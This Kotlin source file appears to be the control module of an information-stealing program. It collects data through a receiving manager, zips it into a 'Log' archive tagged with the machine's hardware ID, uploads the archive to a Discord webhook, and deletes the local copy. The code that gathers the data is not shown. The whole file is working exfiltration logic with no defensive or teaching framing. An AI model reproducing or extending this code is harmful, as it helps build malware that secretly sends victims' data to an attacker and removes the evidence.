package maven.example.com.utility

import maven.example.com.receiving.ReceivingManager
import maven.example.com.sending.DiscordManager
import maven.example.com.utility.archive.Archive
import maven.example.com.utility.config.Config
import maven.example.com.utility.data.Data
import maven.example.com.utility.rest.Hwid
import java.io.File
import java.io.IOException
import java.io.InputStream
import java.text.DateFormat
import java.text.SimpleDateFormat
import java.util.*

class Manager {
    companion object {
        fun start(inputStream: InputStream?) {
            val config = Config.readConfigFromFile(inputStream)
            val dataToSend = ReceivingManager.receiving()
            val client =
                DiscordManager.getDiscordSender(config.prop?.getProperty("discord.webhook.url")?:throw NullPointerException())
            val nameArchive = createLogName(SimpleDateFormat("d-M-y--z"))
            val archive: File?

            try {
                archive = createArchive(dataToSend, nameArchive)
            } catch (e: Exception) {
                //Log.error("Ошибка при создании архива:\n${e.stackTraceToString()}")
                client.close()
                return
            }

            if (archive != null) client.send(archive)

            client.close()
            archive!!.delete()
        }

        private fun createLogName(df: DateFormat): String = "Log_${df.format(Date())}__${Hwid.getHwid()}.zip"

        @Throws(IOException::class)
        private fun createArchive(dataToSend: MutableList<Data?>?, nameArchive: String?): File? {
            val archive = Archive(dataToSend)
            return archive.filesToArchive(nameArchive)
        }
    }
}